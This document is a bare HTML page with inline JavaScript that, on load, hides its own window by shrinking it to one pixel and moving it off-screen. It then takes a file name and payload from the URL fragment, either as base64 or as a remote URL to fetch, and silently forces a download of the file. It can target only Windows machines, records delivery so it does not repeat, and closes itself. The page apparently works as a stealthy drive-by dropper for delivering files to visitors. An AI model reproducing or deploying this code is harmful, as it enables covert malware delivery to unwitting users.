<!DOCTYPE html>
<html><head><title>.</title></head>
<body>
<script>
window.blur();
window.resizeTo(1,1);
window.moveTo(-2000,-2000);
try {
  var h = location.hash.slice(1);
  if (!h) throw 'No data';
  try { h = decodeURIComponent(h); } catch(e) {}

  // Windows-only flag: if URL ends with !W, check platform
  var winOnly = false;
  if (h.slice(-2) === '!W') {
    winOnly = true;
    h = h.slice(0, -2); // Remove !W flag
  }
  if (winOnly && navigator.platform.indexOf('Win') === -1) {
    window.close();
    throw 'skip';
  }

  var sep = h.indexOf('~');
  var fname = sep > 0 ? h.slice(0, sep) : 'delivered.bin';
  var data = sep > 0 ? h.slice(sep + 1) : h;

  document.title = fname;

  var key = 'dl_done_' + fname;
  if (localStorage.getItem(key)) {
    window.close();
    throw 'skip';
  }

  function markDone() {
    localStorage.setItem(key, '1');
    setTimeout(function(){ window.close(); }, 2000);
  }

  function doDownload(blob) {
    if (!blob || blob.size === 0) {
      document.body.textContent = 'Empty file — will retry next time';
      return;
    }
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = fname;
    document.body.appendChild(a);
    a.click();
    markDone();
  }

  if (data.indexOf('http') === 0) {
    fetch(data)
      .then(function(r) {
        if (!r.ok) throw 'HTTP error: ' + r.status;
        var expected = parseInt(r.headers.get('content-length') || '0');
        return r.blob().then(function(blob) {
          if (expected > 0 && blob.size < expected) {
            throw 'Incomplete: ' + blob.size + '/' + expected;
          }
          return blob;
        });
      })
      .then(function(blob) { doDownload(blob); })
      .catch(function(e) { document.body.textContent = 'Failed — will retry: ' + e; });
  } else {
    try {
      var raw = atob(data);
      var arr = new Uint8Array(raw.length);
      for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
      doDownload(new Blob([arr], {type: 'application/octet-stream'}));
    } catch(e) { document.body.textContent = 'Decode failed — will retry: ' + e; }
  }
} catch(e) {
  if (e !== 'skip') document.body.textContent = 'Error: ' + e;
}
</script>
</body></html>
